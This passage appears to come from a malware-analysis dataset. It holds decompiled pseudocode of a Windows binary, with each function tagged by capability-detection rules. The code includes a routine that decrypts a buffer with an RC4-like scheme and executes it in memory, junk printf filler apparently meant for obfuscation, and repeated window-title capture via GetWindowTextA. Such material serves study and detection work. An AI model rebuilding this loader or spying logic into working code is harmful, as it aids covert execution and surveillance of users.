%ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    puVar15 = puVar14;\n    uVar1 = (*pcVar4)(0, uVar8, puVar14 << 7 | puVar14 << 6, puVar14, 0);\n    puVar9 = (*pcVar3)(uVar1);\n    if (puVar9 != NULL) {\n        puVar11 = puVar9;\n        for (uVar10 = uVar8 >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {\n            *puVar11 = *puVar14;\n            puVar14 = puVar14 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        for (uVar10 = uVar8 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n            *puVar11 = *puVar14;\n            puVar14 = puVar14 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        fcn.00402d90(puVar15, uVar16, puVar9, uVar8);\n        (*puVar9)();\n        fcn.00402410();\n        *in_FS_OFFSET = iVar7;\n        return 1;\n    }\n    fcn.00402410();\n    *in_FS_OFFSET = iVar7;\n    return 0;\n}\n",
        "token_count": 37177
    },
    "00418360": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00418360(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00418524;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x418648\n            switch(*((arg_10h & 3) * 4 + 0x418648)) {\n            case 0x418660:\ncode_r0x00418660:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x418670:\ncode_r0x00418670:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x418684:\ncode_r0x00418684:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x418648\n            switch(*(arg_10h * 4 + 0x418648)) {\n            case 0x418660:\n                goto code_r0x00418660;\n            case 0x418670:\n                goto code_r0x00418670;\n            case 0x418684:\n                goto code_r0x00418684;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x41854c)) {\n            case 0x41855c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00418524:\n    // WARNING: Could not recover jumptable at 0x00418526. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x4185f8\n                    puVar1 = (**(uVar3 * -4 + 0x4185f8))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x418648)) {\n                case 0x418660:\n                    goto code_r0x00418660;\n                case 0x418670:\n                    goto code_r0x00418670;\n                case 0x418684:\n                    goto code_r0x00418684;\n                }\n                break;\n            case 0x418580:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00418524;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x418648)) {\n                case 0x418660:\n                    goto code_r0x00418660;\n                case 0x418670:\n                    goto code_r0x00418670;\n                case 0x418684:\n                    goto code_r0x00418684;\n                }\n                break;\n            case 0x4185a8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00418524;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x418648)) {\n                case 0x418660:\n                    goto code_r0x00418660;\n                case 0x418670:\n                    goto code_r0x00418670;\n                case 0x418684:\n                    goto code_r0x00418684;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x004183bc;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x4184ac\n        switch(*((arg_10h & 3) * 4 + 0x4184ac)) {\n        case 0x4184c4:\ncode_r0x004184c4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x4184d0:\ncode_r0x004184d0:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x4184e4:\ncode_r0x004184e4:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x4184bc)) {\n        case 0x4184c4:\n            goto code_r0x004184c4;\n        case 0x4184d0:\n            goto code_r0x004184d0;\n        case 0x4184e4:\n            goto code_r0x004184e4;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x4183c0)) {\n        case 0x4183d0:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x004183bc:\n    // WARNING: Could not recover jumptable at 0x004183bc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x418440\n                puVar1 = (**(uVar2 * 4 + 0x418440))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4184ac)) {\n            case 0x4184c4:\n                goto code_r0x004184c4;\n            case 0x4184d0:\n                goto code_r0x004184d0;\n            case 0x4184e4:\n                goto code_r0x004184e4;\n            }\n            break;\n        case 0x4183fc:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x004183bc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4184ac)) {\n            case 0x4184c4:\n                goto code_r0x004184c4;\n            case 0x4184d0:\n                goto code_r0x004184d0;\n            case 0x4184e4:\n                goto code_r0x004184e4;\n            }\n            break;\n        case 0x418420:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x004183bc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4184ac)) {\n            case 0x4184c4:\n                goto code_r0x004184c4;\n            case 0x4184d0:\n                goto code_r0x004184d0;\n            case 0x4184e4:\n                goto code_r0x004184e4;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2657
    },
    "004192e0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t * fcn.004192e0(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 387
    },
    "00419370": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00419370(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00419534;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x419658\n            switch(*((arg_10h & 3) * 4 + 0x419658)) {\n            case 0x419670:\ncode_r0x00419670:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x419680:\ncode_r0x00419680:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x419694:\ncode_r0x00419694:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x419658\n            switch(*(arg_10h * 4 + 0x419658)) {\n            case 0x419670:\n                goto code_r0x00419670;\n            case 0x419680:\n                goto code_r0x00419680;\n            case 0x419694:\n                goto code_r0x00419694;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x41955c)) {\n            case 0x41956c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00419534:\n    // WARNING: Could not recover jumptable at 0x00419536. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x419608\n                    puVar1 = (**(uVar3 * -4 + 0x419608))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x419658)) {\n                case 0x419670:\n                    goto code_r0x00419670;\n                case 0x419680:\n                    goto code_r0x00419680;\n                case 0x419694:\n                    goto code_r0x00419694;\n                }\n                break;\n            case 0x419590:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00419534;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x419658)) {\n                case 0x419670:\n                    goto code_r0x00419670;\n                case 0x419680:\n                    goto code_r0x00419680;\n                case 0x419694:\n                    goto code_r0x00419694;\n                }\n                break;\n            case 0x4195b8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00419534;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x419658)) {\n                case 0x419670:\n                    goto code_r0x00419670;\n                case 0x419680:\n                    goto code_r0x00419680;\n                case 0x419694:\n                    goto code_r0x00419694;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x004193cc;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x4194bc\n        switch(*((arg_10h & 3) * 4 + 0x4194bc)) {\n        case 0x4194d4:\ncode_r0x004194d4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x4194e0:\ncode_r0x004194e0:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x4194f4:\ncode_r0x004194f4:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x4194cc)) {\n        case 0x4194d4:\n            goto code_r0x004194d4;\n        case 0x4194e0:\n            goto code_r0x004194e0;\n        case 0x4194f4:\n            goto code_r0x004194f4;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x4193d0)) {\n        case 0x4193e0:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x004193cc:\n    // WARNING: Could not recover jumptable at 0x004193cc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x419450\n                puVar1 = (**(uVar2 * 4 + 0x419450))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4194bc)) {\n            case 0x4194d4:\n                goto code_r0x004194d4;\n            case 0x4194e0:\n                goto code_r0x004194e0;\n            case 0x4194f4:\n                goto code_r0x004194f4;\n            }\n            break;\n        case 0x41940c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x004193cc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4194bc)) {\n            case 0x4194d4:\n                goto code_r0x004194d4;\n            case 0x4194e0:\n                goto code_r0x004194e0;\n            case 0x4194f4:\n                goto code_r0x004194f4;\n            }\n            break;\n        case 0x419430:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x004193cc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4194bc)) {\n            case 0x4194d4:\n                goto code_r0x004194d4;\n            case 0x4194e0:\n                goto code_r0x004194e0;\n            case 0x4194f4:\n                goto code_r0x004194f4;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2653
    },
    "00401da0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401da0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(param_1 + *(*param_1 + 4) + 8) & 6) == 0) {\n        iVar1 = (**(**(param_1 + *(*param_1 + 4) + 0x28) + 0x2c))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    if (uVar2 != 0) {\n        uVar2 = *(param_1 + *(*param_1 + 4) + 8) | uVar2;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        fcn.00426fae(uVar2, 0);\n    }\n    return param_1;\n}\n",
        "token_count": 233
    },
    "00402d90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e54)\n// WARNING: Heritage AFTER dead removal. Example location: s0xfffffd9d : 0x00402e81\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint8_t * fcn.00402d90(int32_t param_1, uint32_t param_2, uint8_t *param_3, int32_t param_4)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar7;\n    uint unaff_EDI;\n    uint in_stack_000003e0;\n    uint in_stack_000003e4;\n    uint in_stack_000003e8;\n    uint in_stack_000003ec;\n    uint in_stack_000003f0;\n    uint in_stack_000003f4;\n    uint in_stack_000003f8;\n    uint in_stack_000003fc;\n    uint in_stack_00000400;\n    uint in_stack_00000404;\n    uint in_stack_00000408;\n    uint noname_3;\n    uint noname_4;\n    uint uVar8;\n    uint noname_4_00;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint in_stack_fffffd8c;\n    uint32_t in_stack_fffffd90;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    if (param_4 == 0) {\n        return NULL;\n    }\n    uVar3 = 0;\n    do {\n        (&stack0xfffffd9c)[uVar3] = uVar3;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0x263);\n    uVar3 = 0;\n    uVar7 = 0;\n    do {\n        uVar1 = (&stack0xfffffd9c)[uVar7];\n        uVar3 = (uVar1 + *(uVar7 % param_2 + param_1) + uVar3) % 0x263;\n        fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n        fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n        fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n        fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n        pcVar2 = _sym.imp.USER32.dll_GetWindowTextA;\n        (&stack0xfffffd9c)[uVar7] = (&stack0xfffffd9c)[uVar3];\n        uVar7 = uVar7 + 1;\n        (&stack0xfffffd9c)[uVar3] = uVar1;\n    } while (uVar7 < 0x263);\n    uVar6 = 1;\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    uVar7 = in_stack_fffffd90 & 0xffffff | uStack612._1_1_ << 0x18;\n    uVar3 = uStack612._1_1_ % 0x263;\n    (&stack0xfffffd9c)[uVar3] = uStack612._1_1_;\n    (*_sym.imp.USER32.dll_GetWindowTextA)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX\n                          , in_stack_fffffd8c, uVar7, uVar6, uVar3);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if (((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) &&\n       (iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))(),  iVar5 == -1)) {\n        uVar3 = 4;\n    }\n    if (uVar3 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar3;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar14 = 4;\n    uVar13 = 0;\n    uVar12 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar12, uVar13, uVar14, uVar6, uVar15, uVar16, uVar17, uVar3, \n                          unaff_ESI, unaff_EBP, unaff_EBX);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if (((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) &&\n       (iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))(),  iVar5 == -1)) {\n        uVar3 = 4;\n    }\n    if (uVar3 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar3;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar11 = 4;\n    uVar10 = 0;\n    uVar9 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar9, uVar10, uVar11, uVar6, uVar12, uVar13, uVar14, uVar3, uVar15\n                          , uVar16, uVar17);\n    uVar6 = 10;\n    fcn.00402920();\n    uVar3 = 0;\n    if ((*(*(*piVar4 + 4) + 8 + piVar4) & 6) == 0) {\n        iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x2c))();\n        uVar7 = 4;\n        if (iVar5 != -1) goto code_r0x00402ff4;\n    }\n    else {\ncode_r0x00402ff4:\n        uVar7 = uVar3;\n        uVar3 = uVar7;\n    }\n    if (uVar7 != 0) {\n        uVar7 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar7;\n        if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        fcn.00426fae(uVar7, 0);\n    }\n    uVar17 = 4;\n    uVar16 = 0;\n    uVar15 = 0;\n    (*pcVar2)();\n    piVar4 = fcn.00402580(0x450d00, \"Window Name: \", uVar15, uVar16, uVar17, uVar6, uVar9, uVar10, uVar11, uVar3, uVar12\n                          , uVar13, uVar14);\n    uVar6 